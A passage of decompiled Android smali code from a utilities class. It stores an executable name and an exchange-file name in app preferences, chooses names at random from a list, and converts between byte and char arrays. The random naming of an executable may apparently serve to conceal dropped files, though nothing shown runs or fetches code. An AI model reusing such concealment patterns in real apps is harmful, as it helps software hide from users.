    invoke-interface {v0, v8, v7}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 270
    const-string v8, "KEY_EXEC"

    invoke-interface {v0, v8, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 271
    const-string v8, "KEY_EXCHANGE_FILE"

    invoke-interface {v0, v8, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 272
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 273
    return-void

    .line 256
    .end local v1    # "exchangeName":Ljava/lang/String;
    .end local v2    # "execIndex":I
    .end local v3    # "execName":Ljava/lang/String;
    :cond_0
    sget-object v8, Lcom/fa/c/Utilities;->names:[Ljava/lang/String;

    array-length v8, v8

    invoke-virtual {v5, v8}, Ljava/util/Random;->nextInt(I)I

    move-result v4

    goto :goto_0

    .line 264
    .restart local v2    # "execIndex":I
    .restart local v3    # "execName":Ljava/lang/String;
    :cond_1
    sget-object v8, Lcom/fa/c/Utilities;->names:[Ljava/lang/String;

    array-length v8, v8

    invoke-virtual {v5, v8}, Ljava/util/Random;->nextInt(I)I

    move-result v4

    goto :goto_1
.end method

.method public static ToBytes([C)[B
    .locals 3
    .param p0, "data"    # [C

    .prologue
    .line 322
    array-length v2, p0

    new-array v1, v2, [B

    .line 323
    .local v1, "toRet":[B
    const/4 v0, 0x0

    .local v0, "i":I
    :goto_0
    array-length v2, v1

    if-lt v0, v2, :cond_0

    .line 327
    return-object v1

    .line 325
    :cond_0
    aget-char v2, p0, v0

    int-to-byte v2, v2

    aput-byte v2, v1, v0

    .line 323
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method public static ToChar([B)[C
    .locals 3
    .param p0, "data"    # [B

    .prologue
    .line 332
    array-length v2, p0

    new-array v1, v2, [C

    .line 333
    .local v1, "toRet":[C
    const/4 v0, 0x0

    .local v0, "i":I
    :goto_0
    array-length v2, v1

    if-lt v0, v2, :cond_0

    .line 337
    return-object v1

    .line 335
    :cond_0
    aget-byte v2, p0, v0

    int-to-char v2, v2

    aput-char v2, v1, v0

    .line 333
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method
